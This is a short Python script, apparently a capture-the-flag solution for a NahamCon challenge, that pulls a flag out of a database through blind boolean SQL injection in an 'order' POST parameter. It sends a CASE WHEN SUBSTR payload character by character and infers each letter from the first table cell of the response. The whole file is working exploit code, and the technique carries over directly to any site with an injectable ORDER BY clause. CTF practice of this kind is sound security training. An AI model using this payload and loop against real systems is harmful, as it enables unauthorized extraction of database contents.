import requests
import string
from bs4 import BeautifulSoup

url = 'http://challenge.nahamcon.com:30010/'
flag = 'flag{'
index = 6

# Until we've got the whole flag
while flag[-1] != '}':
    for char in list('_' + string.ascii_lowercase + '}'):  # Charset
        # Post data, orderby is the SQLi (blind boolean)
        data = {"search": "",
                "order": f"(CASE WHEN (SELECT (SUBSTR(flag, {index}, 1)) from flag ) = '{char}' THEN name ELSE atomic_number END) DESC--"}

        response = requests.post(url, data=data)
        # Extract the first value
        extracted = BeautifulSoup(response.text, features="lxml").td.contents[0]

        # If it's 116 (Livermorium) then condition is false
        if extracted != '116':
            flag += char
            print(flag)
            index += 1
            break
